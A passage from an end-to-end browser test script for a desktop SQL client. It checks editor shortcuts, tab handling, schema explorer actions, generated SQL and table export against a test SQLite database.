    await page.waitForFunction(() => document.querySelector('input[name="scriptOnError"][value="continue"]')?.checked && !document.querySelector('input[name="scriptOnError"]')?.matches(":disabled"));
    assert.equal(await settings.getByRole("checkbox", { name: /Notify me when a long run finishes/ }).isChecked(), false, "notifications are opt-in");
  });
  assert.match(await actions.getByRole("button", { name: "Run options" }).getAttribute("title"), /Continue/);
  await withSettings("scripts", async (settings) => {
    await settings.getByRole("radio", { name: "Stop the script" }).check();
    await page.waitForFunction(() => document.querySelector('input[name="scriptOnError"][value="stop"]')?.checked && !document.querySelector('input[name="scriptOnError"]')?.matches(":disabled"));
  });

  step("SQL editor: VS Code line and multi-cursor shortcuts");
  await replaceQuery(panel, "first\nsecond");
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Shift+Alt+ArrowDown");
  assert.equal(await sqlEditor.innerText(), "first\nfirst\nsecond");
  await page.keyboard.press("Control+z");
  assert.equal(await sqlEditor.innerText(), "first\nsecond");
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Control+Alt+ArrowDown");
  await page.keyboard.insertText("x");
  assert.equal(await sqlEditor.innerText(), "xfirst\nxsecond");

  await replaceQuery(panel, "word word words word");
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Control+d");
  await page.keyboard.press("Control+d");
  await page.keyboard.insertText("item");
  assert.equal(await sqlEditor.innerText(), "item item words word");
  await replaceQuery(panel, "word word words word");
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Control+Shift+l");
  await page.keyboard.insertText("item");
  assert.equal(await sqlEditor.innerText(), "item item words item");
  await replaceQuery(panel, "word word words word");
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Shift+ArrowRight");
  await page.keyboard.press("Control+Shift+l");
  await page.keyboard.insertText("X");
  assert.equal(await sqlEditor.innerText(), "Xord Xord Xords Xord");

  await replaceQuery(panel, "aaaa\nbbbb\ncccc");
  const linePoint = async (lineIndex, offset) => panel.locator(".cm-line").nth(lineIndex).evaluate((line, index) => {
    const walker = document.createTreeWalker(line, NodeFilter.SHOW_TEXT);
    let node = walker.nextNode();
    let remaining = index;
    while (node && remaining > node.textContent.length) {
      remaining -= node.textContent.length;
      node = walker.nextNode();
    }
    const range = document.createRange();
    range.setStart(node, remaining);
    range.collapse(true);
    const box = range.getBoundingClientRect();
    return { x: box.left, y: (box.top + box.bottom) / 2 };
  }, offset);
  let firstPoint = await linePoint(0, 0);
  let secondPoint = await linePoint(1, 0);
  await page.mouse.click(firstPoint.x, firstPoint.y);
  await page.keyboard.down("Alt");
  await page.mouse.click(secondPoint.x, secondPoint.y);
  await page.keyboard.up("Alt");
  await page.keyboard.insertText("X");
  assert.equal(await sqlEditor.innerText(), "Xaaaa\nXbbbb\ncccc");

  await replaceQuery(panel, "aaaa\nbbbb\ncccc");
  firstPoint = await linePoint(0, 0);
  const lastPoint = await linePoint(2, 2);
  await page.mouse.move(firstPoint.x, firstPoint.y);
  await page.keyboard.down("Shift");
  await page.keyboard.down("Alt");
  await page.mouse.down();
  await page.mouse.move(lastPoint.x, lastPoint.y, { steps: 5 });
  await page.mouse.up();
  await page.keyboard.up("Alt");
  await page.keyboard.up("Shift");
  await page.keyboard.insertText("X");
  assert.equal(await sqlEditor.innerText(), "Xaa\nXbb\nXcc");

  // A normal click followed by Shift+Alt+click uses the first position as the anchor.
  await replaceQuery(panel, "aaaa\nbbbb\ncccc");
  firstPoint = await linePoint(0, 0);
  let endPoint = await linePoint(2, 2);
  await page.mouse.click(firstPoint.x, firstPoint.y);
  await page.keyboard.down("Shift");
  await page.keyboard.down("Alt");
  await page.mouse.click(endPoint.x, endPoint.y);
  await page.keyboard.up("Alt");
  await page.keyboard.up("Shift");
  await page.keyboard.insertText("X");
  assert.equal(await sqlEditor.innerText(), "Xaa\nXbb\nXcc");

  // Both endpoints can also be clicked while keeping the modifiers pressed.
  await replaceQuery(panel, "aaaa\nbbbb\ncccc");
  firstPoint = await linePoint(0, 0);
  endPoint = await linePoint(2, 2);
  await page.keyboard.down("Shift");
  await page.keyboard.down("Alt");
  await page.mouse.click(firstPoint.x, firstPoint.y);
  await page.mouse.click(endPoint.x, endPoint.y);
  await page.keyboard.up("Alt");
  await page.keyboard.up("Shift");
  await page.keyboard.insertText("X");
  assert.equal(await sqlEditor.innerText(), "Xaa\nXbb\nXcc");

  step("format: Shift+Alt+F and the Format button, one undo step, errors shown");
  await replaceQuery(panel, "select id, total from orders where total > 100 and id < 5");
  await page.keyboard.press("Shift+Alt+F");
  const formatted = "select\n  id,\n  total\nfrom\n  orders\nwhere\n  total > 100\n  and id < 5";
  for (let i = 0; i < 20 && (await sqlEditor.innerText()) !== formatted; i++) await page.waitForTimeout(100);
  assert.equal(await sqlEditor.innerText(), formatted);
  await shot("05e-formatted");
  await page.keyboard.press("Control+z");
  assert.equal(await sqlEditor.innerText(), "select id, total from orders where total > 100 and id < 5");
  await replaceQuery(panel, "select 'unterminated");
  await panel.getByRole("button", { name: "Format", exact: true }).click();
  await panel.getByRole("alert").filter({ hasText: "Could not format" }).waitFor();
  assert.equal(await sqlEditor.innerText(), "select 'unterminated");

  step("tabs: Ctrl+W closes, Ctrl+Shift+T reopens with the SQL, Ctrl+Tab goes back to the previous tab");
  const queryTabCount = await page.locator(".tabbar .tab").count();
  await sqlEditor.click();
  await page.keyboard.press("Control+w");
  await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n, queryTabCount - 1);
  await page.keyboard.press("Control+Shift+T");
  await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n, queryTabCount);
  assert.equal(await panel.locator(".cm-content").innerText(), "select 'unterminated");
  assert.equal(await panel.locator("select").first().evaluate((el) => el.selectedOptions[0].text), "Shop (SQLite) (sqlite)");
  const activeName = () => page.locator(".tabbar .tab.active").innerText();
  const reopened = await activeName();
  await page.keyboard.press("Control+Tab");
  assert.notEqual(await activeName(), reopened);
  // Most recently used first: a second quick Ctrl+Tab comes back.
  await page.keyboard.press("Control+Tab");
  assert.equal(await activeName(), reopened);
  await page.keyboard.press("Control+PageDown");
  assert.notEqual(await activeName(), reopened);
  await page.keyboard.press("Control+PageUp");
  assert.equal(await activeName(), reopened);
  await page.locator(".tabbar .tab.active").focus();
  await page.keyboard.press("ArrowRight");
  assert.notEqual(await activeName(), reopened);
  await page.keyboard.press("ArrowLeft");
  assert.equal(await activeName(), reopened);
  const addTabButton = page.getByRole("button", { name: "New query (Ctrl+T)" });
  assert.ok(await addTabButton.isVisible());
  assert.equal(await addTabButton.evaluate((el) => el.parentElement.classList.contains("tab-strip")), true);
  await addTabButton.click();
  await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n + 1, queryTabCount);
  await page.locator(".tabbar .tab.active .close").click();
  await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n, queryTabCount);
  assert.equal(await activeName(), reopened);
  await shot("05e-tabs-light");
  await setTheme("dark", "dark");
  await shot("05e-tabs-dark");
  await setTheme("light", "light");

  step("tab management: rename, pin, duplicate, drag, the Ctrl+Tab switcher, the running indicator and maximized results");
  {
    const tabs = page.locator(".tabbar .tab");
    const activeTab = page.locator(".tabbar .tab.active");
    const shown = page.locator(".tab-panel:not([hidden])");
    const labels = () => page.locator(".tabbar .tab .tab-label").allInnerTexts();
    const activeLabel = () => activeTab.locator(".tab-label").innerText();
    const tabMenu = page.getByRole("menu", { name: /^Actions for / });
    // Rename from the tab's menu: the name is edited in place, Enter keeps it.
    await activeTab.click({ button: "right" });
    await tabMenu.getByRole("menuitem", { name: /^Rename/ }).click();
    const renameInput = activeTab.locator("input.tab-rename");
    await renameInput.waitFor();
    await renameInput.fill("Orders report");
    await renameInput.press("Enter");
    await renameInput.waitFor({ state: "detached" });
    assert.equal(await activeLabel(), "Orders report");
    // Ctrl+F2 renames too; Escape keeps the old name.
    await page.keyboard.press("Control+F2");
    await renameInput.waitFor();
    await page.keyboard.insertText("Not kept");
    await page.keyboard.press("Escape");
    await renameInput.waitFor({ state: "detached" });
    assert.equal(await activeLabel(), "Orders report");
    // Pin from the menu: pinned tabs sort first, and their × becomes an unpin button.
    await activeTab.click({ button: "right" });
    await tabMenu.getByRole("menuitem", { name: /^Pin/ }).click();
    await page.locator('.tabbar .tab.active[data-pinned="true"]').waitFor();
    assert.equal((await labels())[0], "Orders report");
    assert.equal(await activeTab.locator("button.close").getAttribute("aria-label"), "Unpin Orders report");
    await shot("05f-tab-pinned");
    await page.keyboard.press("Control+Alt+p");
    await page.locator(".tabbar .tab.active:not([data-pinned])").waitFor();
    await page.keyboard.press("Control+Alt+p");
    await page.locator('.tabbar .tab.active[data-pinned="true"]').waitFor();
    // Duplicate (Ctrl+Alt+D): next to it, same SQL and connection, no session, not pinned.
    const beforeCopy = await tabs.count();
    await page.keyboard.press("Control+Alt+d");
    await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n + 1, beforeCopy);
    assert.equal(await activeLabel(), "Orders report (copy)");
    assert.equal(await activeTab.getAttribute("data-pinned"), null);
    assert.deepEqual((await labels()).slice(0, 2), ["Orders report", "Orders report (copy)"]);
    assert.equal(await shown.locator(".cm-content").innerText(), "select 'unterminated");
    assert.equal(await shown.locator("select").first().evaluate((el) => el.selectedOptions[0].text), "Shop (SQLite) (sqlite)");
    await activeTab.locator(".dot-disconnected").waitFor();
    // Drag the copy one place right, then onto the pinned tab: it stays after the pinned ones.
    const dragTab = async (from, to, end) => {
      const a = await tabs.nth(from).boundingBox();
      const b = await tabs.nth(to).boundingBox();
      await page.mouse.move(a.x + a.width / 2, a.y + a.height / 2);
      await page.mouse.down();
      await page.mouse.move(a.x + a.width / 2 + (end === "right" ? 12 : -12), a.y + a.height / 2, { steps: 3 });
      await page.mouse.move(end === "right" ? b.x + b.width - 6 : b.x + 6, b.y + b.height / 2, { steps: 8 });
      await page.locator(".tabbar .tab.dragging").waitFor();
    };
    await dragTab(1, 2, "right");
    await shot("05f-tab-drag");
    await page.mouse.up();
    await page.locator(".tabbar .tab.dragging").waitFor({ state: "detached" });
    assert.equal((await labels())[2], "Orders report (copy)");
    assert.equal(await activeLabel(), "Orders report (copy)");
    await dragTab(2, 0, "left");
    await page.mouse.up();
    await page.locator(".tabbar .tab.dragging").waitFor({ state: "detached" });
    assert.deepEqual((await labels()).slice(0, 2), ["Orders report", "Orders report (copy)"]);
    // Ctrl+Shift+PageDown / PageUp move the active tab by one place.
    await page.keyboard.press("Control+Shift+PageDown");
    assert.equal((await labels())[2], "Orders report (copy)");
    await page.keyboard.press("Control+Shift+PageUp");
    assert.equal((await labels())[1], "Orders report (copy)");
    // Ctrl+Tab: hold Ctrl and press Tab to walk the most recently used tabs; release to switch.
    await page.keyboard.down("Control");
    await page.keyboard.press("Tab");
    const switcher = page.getByRole("listbox", { name: "Recently used tabs" });
    await switcher.waitFor();
    assert.equal(await switcher.getByRole("option", { selected: true }).innerText(), "Orders report");
    await page.keyboard.press("Tab");
    const third = await switcher.getByRole("option", { selected: true }).innerText();
    assert.ok(!third.startsWith("Orders report"), third);
    await shot("05f-tab-switcher");
    await page.keyboard.up("Control");
    await switcher.waitFor({ state: "detached" });
    assert.equal(await activeLabel(), third);
    // Escape keeps the current tab; a click on a row switches to it.
    await page.keyboard.down("Control");
    await page.keyboard.press("Tab");
    await switcher.waitFor();
    await page.keyboard.press("Escape");
    await page.keyboard.up("Control");
    await switcher.waitFor({ state: "detached" });
    assert.equal(await activeLabel(), third);
    await page.keyboard.down("Control");
    await page.keyboard.press("Tab");
    await switcher.getByRole("option", { name: "Orders report (copy)" }).click();
    await page.keyboard.up("Control");
    await switcher.waitFor({ state: "detached" });
    assert.equal(await activeLabel(), "Orders report (copy)");
    // A query running shows on its tab, until it is cancelled.
    await replaceQuery(shown, "with recursive spin(i) as (select 1 union all select i + 1 from spin) select count(*) from spin;");
    await run(shown);
    await activeTab.locator(".tab-running").waitFor();
    assert.equal(await activeTab.locator(".tab-running").getAttribute("aria-label"), "A query is running");
    await shot("05f-tab-running");
    await shown.getByRole("button", { name: "Cancel", exact: true }).click();
    await activeTab.locator(".tab-running").waitFor({ state: "detached" });
    await activeTab.locator(".dot-connected").waitFor();
    // Maximize the results (button or Ctrl+Alt+M): the editor hides and comes back unchanged.
    await replaceQuery(shown, "select 1 as maximized;");
    await run(shown);
    await shown.locator(".grid-host").waitFor();
    await shown.getByRole("button", { name: "Maximize results (Ctrl+Alt+M)" }).click();
    await shown.locator(".editor-pane").waitFor({ state: "hidden" });
    await shot("05f-results-maximized");
    await page.keyboard.press("Control+Alt+m");
    await shown.locator(".editor-pane").waitFor({ state: "visible" });
    assert.equal(await shown.locator(".cm-content").innerText(), "select 1 as maximized;");
    await page.keyboard.press("Control+Alt+m");
    await shown.locator(".editor-pane").waitFor({ state: "hidden" });
    await shown.getByRole("button", { name: "Restore the editor (Ctrl+Alt+M)" }).click();
    await shown.locator(".editor-pane").waitFor({ state: "visible" });
    // Back as it was for the next steps: the copy closed, the original unpinned.
    await page.keyboard.press("Control+w");
    await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n, beforeCopy);
    await tabs.first().click();
    assert.equal(await activeLabel(), "Orders report");
    await activeTab.getByRole("button", { name: "Unpin Orders report" }).click();
    await page.locator(".tabbar .tab.active:not([data-pinned])").waitFor();
  }

  step("explorer: view rows and generate SQL written by the core");
  await page.locator('.connection-row:has-text("Shop (SQLite)") .twisty').click();
  const mainSchemaNode = page.getByRole("button", { name: "Expand or collapse schema main" });
  assert.equal(await mainSchemaNode.evaluate((el) => getComputedStyle(el).cursor), "pointer");
  await mainSchemaNode.click();
  // Objects are in folders by type (ADR-024), with how many each holds.
  const tablesFolder = page.getByRole("button", { name: "Expand or collapse Tables", exact: true });
  assert.equal(await tablesFolder.evaluate((el) => getComputedStyle(el).cursor), "pointer");
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  await tablesFolder.click();
  await page.getByRole("button", { name: "Expand or collapse Views", exact: true }).click();
  const ordersNode = page.getByRole("button", { name: "Expand or collapse orders", exact: true });
  const tabsBeforeGeneratedSql = await page.getByRole("tab").count();
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  await page.getByRole("menuitem", { name: "Generate UPDATE", exact: true }).click();
  const generatedDialog = page.getByRole("dialog", { name: "Generated SQL" });
  const generatedEditor = generatedDialog.getByRole("textbox", { name: "SQL editor" });
  await generatedEditor.waitFor();
  assert.match(await generatedEditor.inputValue(), /^UPDATE orders\nSET\n/);
  assert.equal(await page.getByRole("tab").count(), tabsBeforeGeneratedSql);
  const copiedBeforeSql = await page.evaluate(() => window.__copied.length);
  await generatedEditor.fill("SELECT 42;");
  await generatedDialog.getByRole("button", { name: "Copy", exact: true }).click();
  assert.equal(await copied(copiedBeforeSql + 1), "SELECT 42;");
  await shot("05f-generated-update");
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  await page.getByRole("button", { name: "Expand or collapse big_orders", exact: true }).click({ button: "right" });
  assert.equal(await page.getByRole("menuitem", { name: "Generate DELETE", exact: true }).count(), 0);
  await page.getByRole("menuitem", { name: "Open as SQL" }).click();
  await panel.locator(".cm-content", { hasText: "FROM big_orders" }).waitFor();
  assert.equal((await panel.locator(".cm-content").innerText()).trimEnd(), "SELECT *\nFROM big_orders\nLIMIT 100;");
  // A trigger's definition, as SQLite keeps it, opens in a new tab and does not run.
  await page.getByRole("button", { name: "Expand or collapse Triggers", exact: true }).click();
  const triggerNode = page.getByRole("button", { name: "product_stock_check: open its definition", exact: true });
  assert.equal(await triggerNode.locator(".muted").innerText(), "on product");
  await triggerNode.dblclick();
  await panel.locator(".cm-content", { hasText: "CREATE TRIGGER product_stock_check" }).waitFor();
  assert.match((await panel.locator(".cm-content").innerText()).trimEnd(), /^CREATE TRIGGER product_stock_check before update of stock on product[\s\S]*end;$/);
  await shot("05g-trigger-definition");
  // A table exposes all five detail folders, including its own triggers.
  const productNode = page.getByRole("button", { name: "Expand or collapse product", exact: true });
  assert.equal(await productNode.locator(".twisty").evaluate((el) => getComputedStyle(el).cursor), "pointer");
  assert.equal(await productNode.locator(".label").evaluate((el) => getComputedStyle(el).cursor), "pointer");
  await productNode.locator(".label").click();
  assert.equal(await productNode.getAttribute("aria-expanded"), "false");
  await productNode.locator(".twisty").click();
  assert.equal(await productNode.getAttribute("aria-expanded"), "true");
  await productNode.focus();
  await page.keyboard.press("Enter");
  assert.equal(await productNode.getAttribute("aria-expanded"), "false");
  await productNode.locator(".twisty").click();
  const productChildren = productNode.locator("xpath=..");
  for (const folder of ["Columns", "Constraints", "Foreign keys", "Indexes", "Triggers"]) {
    const folderNode = productChildren.getByRole("button", { name: `Expand or collapse ${folder}`, exact: true });
    await folderNode.waitFor();
    const expanded = await folderNode.getAttribute("aria-expanded");
    await folderNode.locator(".label").click();
    assert.equal(await folderNode.getAttribute("aria-expanded"), expanded);
    await folderNode.locator(".label").dblclick();
    const overview = page.getByRole("region", { name: `${folder} of product` });
    await overview.waitFor();
    if (folder === "Columns") {
      await page.waitForFunction(() => {
        const bar = document.querySelector(".tabbar")?.getBoundingClientRect();
        const active = document.querySelector(".tabbar .tab.active")?.getBoundingClientRect();
        return bar && active && active.left >= bar.left && active.right <= bar.right;
      });
      await shot("05f-tabs-metadata");
    }
    const overviewWidth = await overview.evaluate((el) => ({ view: el.getBoundingClientRect().width, panel: el.parentElement.getBoundingClientRect().width }));
    assert.ok(Math.abs(overviewWidth.view - overviewWidth.panel) < 1, JSON.stringify(overviewWidth));
    assert.equal(await folderNode.getAttribute("aria-expanded"), expanded);
    if (folder === "Triggers") await overview.getByText("product_stock_check", { exact: true }).waitFor();
    if (folder === "Columns") {
      await overview.getByText("stock", { exact: true }).waitFor();
      await overview.getByRole("row").filter({ hasText: "stock" }).getByRole("button", { name: "Rename…" }).click();
      const rename = page.getByRole("dialog", { name: "Rename column stock of product" });
      await rename.getByLabel("SQL that will run").waitFor();
      await rename.getByRole("button", { name: "Cancel" }).click();
      await overview.getByRole("checkbox", { name: "Select column stock" }).check();
      await overview.getByRole("button", { name: "New index on (stock)" }).click();
      await panel.locator(".cm-content", { hasText: "CREATE INDEX" }).waitFor();
      await page.keyboard.press("Control+w");
      await overview.waitFor();
      // Create a column via the form; SQL is reviewed and run in an editor first.
      await overview.getByRole("button", { name: "Add…" }).click();
      const addColumn = page.getByRole("dialog", { name: "Add to Columns of product" });
      await addColumn.getByLabel("Name", { exact: true }).fill("smoke_added");
      await addColumn.getByRole("combobox", { name: "Data type", exact: true }).selectOption("INTEGER");
      await addColumn.getByRole("combobox", { name: "Data type", exact: true }).selectOption("__custom__");
      await addColumn.getByLabel("Custom data type").fill("INTEGER");
      await shot("05f-add-column-form");
      const previousTheme = await page.evaluate(() => { const theme = document.documentElement.dataset.theme; document.documentElement.dataset.theme = "dark"; return theme; });
      await shot("05f-add-column-form-dark");
      await page.evaluate((theme) => { if (theme === undefined) delete document.documentElement.dataset.theme; else document.documentElement.dataset.theme = theme; }, previousTheme);
      await addColumn.getByRole("button", { name: "Open SQL" }).click();
      await panel.locator(".cm-content", { hasText: "ALTER TABLE product ADD COLUMN smoke_added INTEGER;" }).waitFor();
      await run(panel);
      await panel.getByText(/Statement 1: (OK|0 rows)/).waitFor();
      await page.keyboard.press("Control+w");
      await overview.getByRole("button", { name: "Refresh" }).click();
      const addedRow = overview.getByText("smoke_added", { exact: true }).locator("xpath=..");
      await addedRow.getByRole("button", { name: "Drop…" }).click();
      const dropAdded = page.getByRole("dialog", { name: "Drop smoke_added" });
      await dropAdded.getByRole("button", { name: "Cancel" }).waitFor();
      assert.ok(await dropAdded.getByRole("button", { name: "Cancel" }).evaluate((button) => document.activeElement === button), "destructive confirmation starts on Cancel");
      await dropAdded.getByLabel("SQL that will run").filter({ hasText: "DROP COLUMN smoke_added" }).waitFor();
      await dropAdded.getByRole("button", { name: "Drop", exact: true }).click();
      await overview.getByText("smoke_added", { exact: true }).waitFor({ state: "detached" });
      // A lost metadata session must not reconnect or repeat its catalog read by itself.
      const detailsSession = (await page.locator(".tabbar .tab.active").getAttribute("id")).replace("workspace-", "");
      await page.evaluate((session) => window.__TAURI_INTERNALS__.invoke("plugin:event|emit", {
        event: "session-lost", payload: { session, reason: "Test connection lost" },
      }), detailsSession);
      await overview.getByRole("button", { name: "Reconnect" }).waitFor();
      await folderNode.locator(".label").dblclick();
      await overview.getByRole("button", { name: "Reconnect" }).waitFor();
      await overview.getByRole("button", { name: "Reconnect" }).click();
      await overview.getByText("Reconnected. Refresh to load the metadata again.").waitFor();
      assert.equal(await overview.getByText("stock", { exact: true }).count(), 0);
      await overview.getByRole("button", { name: "Refresh" }).click();
      await overview.getByText("stock", { exact: true }).waitFor();
    }
    if (folder === "Constraints" || folder === "Foreign keys") assert.ok(await overview.getByRole("button", { name: "Add…" }).isDisabled());
    if (folder === "Indexes" || folder === "Triggers") {
      await overview.getByRole("button", { name: "Add…" }).click();
      const add = page.getByRole("dialog", { name: `Add to ${folder} of product` });
      await add.getByLabel("Name", { exact: true }).fill(folder === "Indexes" ? "smoke_new_index" : "smoke_new_trigger");
      if (folder === "Indexes") await add.getByLabel("stock", { exact: true }).check();
      else await add.getByLabel("Trigger statement").fill("SELECT 1");
      if (folder === "Triggers") await shot("05f-add-trigger-form");
      await add.getByRole("button", { name: "Open SQL" }).click();
      await panel.locator(".cm-content", { hasText: folder === "Indexes" ? "CREATE INDEX smoke_new_index" : "CREATE TRIGGER smoke_new_trigger" }).waitFor();
      await page.keyboard.press("Control+w");
      await overview.waitFor();
    }
    await page.keyboard.press("Control+w");
    await overview.waitFor({ state: "detached" });
  }
  // The arrow still expands the folder and exposes its entries.
  const productTriggers = productChildren.getByRole("button", { name: "Expand or collapse Triggers", exact: true });
  if (await productTriggers.getAttribute("aria-expanded") === "true") await productTriggers.locator(".twisty").click();
  await productTriggers.locator(".twisty").click();
  await productChildren.getByRole("button", { name: "product_stock_check: open its definition", exact: true }).waitFor();
  await productNode.locator(".twisty").click();
  // A table holds folders of its columns (open), constraints, foreign keys and indexes.
  await ordersNode.locator(".twisty").click();
  const ordersChildren = ordersNode.locator("xpath=..");
  const columnsFolder = ordersChildren.getByRole("button", { name: "Expand or collapse Columns", exact: true });
  await columnsFolder.waitFor();
  assert.equal(await columnsFolder.getAttribute("aria-expanded"), "true");
  // DBeaver's Advanced Copy (Ctrl+Shift+C): a column's name qualified as the core writes it.
  const copiedBeforeColumn = await page.evaluate(() => window.__copied.length);
  await ordersChildren.locator(".leaf-row", { hasText: "customer_id" }).first().focus();
  await page.keyboard.press("Control+Shift+c");
  assert.equal(await copied(copiedBeforeColumn + 1), "orders.customer_id");
  await ordersChildren.getByRole("button", { name: "Expand or collapse Constraints", exact: true }).locator(".twisty").click();
  await ordersChildren.locator(".row", { hasText: "PRIMARY KEY (id)" }).waitFor();
  await ordersChildren.getByRole("button", { name: "Expand or collapse Foreign keys", exact: true }).locator(".twisty").click();
  await ordersChildren.locator(".row", { hasText: "(customer_id) → customer (id)" }).waitFor();
  await ordersChildren.getByRole("button", { name: "Expand or collapse Indexes", exact: true }).locator(".twisty").click();
  await ordersChildren.getByRole("button", { name: "orders_customer: open its definition", exact: true }).dblclick();
  await panel.locator(".cm-content", { hasText: "CREATE INDEX orders_customer" }).waitFor();
  assert.equal((await panel.locator(".cm-content").innerText()).trimEnd(), "CREATE INDEX orders_customer on orders (customer_id);");
  await shot("05g-table-folders");
  await ordersNode.locator(".twisty").click();
  // "Generate DDL": the table's CREATE and indexes in an editable preview.
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  const generateMenu = page.getByRole("menu", { name: "Generate SQL" });
  await generateMenu.waitFor();
  assert.equal(await generateMenu.evaluate((el) => getComputedStyle(el).overflowY), "auto");
  assert.equal(await generateMenu.evaluate((el) => el.parentElement === document.body), true);
  await page.getByRole("menuitem", { name: "Generate DDL" }).click();
  await generatedEditor.waitFor();
  const ordersDdl = (await generatedEditor.inputValue()).trimEnd();
  assert.match(ordersDdl, /^CREATE TABLE orders \(/);
  assert.ok(ordersDdl.endsWith("CREATE INDEX orders_customer on orders (customer_id);"), ordersDdl);
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  // Rows by a list of keys.
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  await page.getByRole("menuitem", { name: "Generate SELECT … WHERE key IN" }).click();
  await generatedEditor.waitFor();
  assert.ok((await generatedEditor.inputValue()).trimEnd().endsWith("FROM orders\nWHERE id IN (:id_1, :id_2, :id_3);"));
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  // The engine decides what else: SQLite has an upsert, and no MERGE.
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  await page.getByRole("menuitem", { name: "Generate upsert (INSERT or UPDATE)" }).waitFor();
  assert.equal(await page.getByRole("menuitem", { name: "Generate MERGE" }).count(), 0);
  await page.getByRole("menuitem", { name: "Generate upsert (INSERT or UPDATE)" }).click();
  await generatedEditor.waitFor();
  assert.ok((await generatedEditor.inputValue()).includes("ON CONFLICT (id) DO UPDATE SET"));
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  // UPDATE … FROM a source of values; SQLite has no DELETE … USING.
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  await page.getByRole("menuitem", { name: "Generate UPDATE … FROM" }).waitFor();
  assert.equal(await page.getByRole("menuitem", { name: "Generate DELETE … USING" }).count(), 0);
  await page.getByRole("menuitem", { name: "Generate UPDATE … FROM" }).click();
  await generatedEditor.waitFor();
  assert.match(await generatedEditor.inputValue(), /^UPDATE orders AS target\nSET\n/);
  assert.ok((await generatedEditor.inputValue()).includes("WHERE target.id = source.id"));
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  // Ctrl+click chooses tables; their menu joins them on the foreign keys between them.
  const customerRow = page.getByRole("button", { name: "Expand or collapse customer", exact: true });
  await ordersNode.click({ modifiers: ["Control"] });
  await customerRow.click({ modifiers: ["Control"] });
  assert.equal(await ordersNode.getAttribute("aria-selected"), "true");
  assert.equal(await customerRow.getAttribute("aria-selected"), "true");
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  await page.getByRole("menuitem", { name: "Generate INNER JOIN of the 2 chosen tables" }).click();
  await generatedEditor.waitFor();
  assert.equal((await generatedEditor.inputValue()).trimEnd(), "SELECT *\nFROM orders o\nINNER JOIN customer c ON c.id = o.customer_id;");
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  // Copy takes every chosen table, one name per line.
  const copiedBeforeNames = await page.evaluate(() => window.__copied.length);
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Copy 2 names" }).click();
  assert.equal(await copied(copiedBeforeNames + 1), "orders\ncustomer");
  // Export streams the chosen tables without opening them: one file each into a folder,
  // never over a file that is there.
  {
    const folder = join(userDir, "tables");
    mkdirSync(folder, { recursive: true });
    writeFileSync(join(folder, "orders.csv"), "keep");
    await page.evaluate((target) => (window.__spelaionOpenFolder = target), folder);
    await ordersNode.click({ button: "right" });
    await page.getByRole("menuitem", { name: "Export 2 tables…" }).click();
    const dialog = page.getByRole("dialog", { name: "Export 2 tables" });
    await dialog.getByRole("button", { name: "Export…" }).click();
    await dialog.locator(".export-result", { hasText: "2 files" }).waitFor();
    await shot("05e-export-tables");
    await dialog.getByRole("button", { name: "Close" }).click();
    await page.evaluate(() => delete window.__spelaionOpenFolder);
    assert.equal(readFileSync(join(folder, "orders.csv"), "utf8"), "keep");
    const orders = readFileSync(join(folder, "orders (2).csv"), "utf8").trimEnd().split("\r\n");
    assert.equal(orders.length, 50_001);
    assert.ok(orders[0].startsWith("\ufeffid,"), orders[0]);
    assert.ok(readFileSync(join(folder, "customer.csv"), "utf8").startsWith("\ufeffid,"));
  }
  // A plain click forgets the choice without expanding the table.
  await ordersNode.click();
  assert.equal(await customerRow.getAttribute("aria-selected"), "false");
  assert.equal(await ordersNode.getAttribute("aria-expanded"), "false");
  // One table from the explorer: to a file, with a progress line and every row.
  {
    const path = join(userDir, "orders.json");
    await page.evaluate((target) => (window.__spelaionSavePath = target), path);
    await customerRow.click({ button: "right" });
    await page.getByRole("menuitem", { name: "Export…", exact: true }).click();
    const dialog = page.getByRole("dialog", { name: "Export customer" });
    await dialog.getByRole("combobox", { name: /^Format/ }).selectOption("json");
    await dialog.getByRole("button", { name: "Export…" }).click();
    await dialog.locator(".export-result", { hasText: "Exported" }).waitFor();
    await dialog.getByRole("button", { name: "Close" }).click();
    await page.evaluate(() => delete window.__spelaionSavePath);
    const customers = JSON.parse(readFileSync(path, "utf8"));
    assert.ok(customers.length > 0);
    assert.ok("id" in customers[0]);
  }
  // Refresh: a table created from a query tab appears with F5 on its schema, and "Refresh all
  // schemas" sees it go; open folders stay open.
  const mainSchema = page.getByRole("button", { name: "Expand or collapse schema main" });
  const probeNode = page.getByRole("button", { name: "Expand or collapse refresh_probe", exact: true });
  await replaceQuery(panel, "create table refresh_probe (id integer);\ninsert into refresh_probe values (1);");
  await run(panel);
  await panel.getByText("Statement 2: 1 row", { exact: false }).waitFor();
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  await mainSchema.focus();
  await page.keyboard.press("F5");
  await probeNode.waitFor();
  assert.equal(await tablesFolder.locator(".muted").innerText(), "4");
  // Two rows: the next step waits for "1 row" in this same tab.
  await replaceQuery(panel, "drop table refresh_probe;\nselect 1 as dropped union all select 2;");
  await run(panel);
  await page.getByRole("button", { name: "Run anyway" }).click();
  await panel.locator(".statusline", { hasText: "2 rows" }).waitFor();
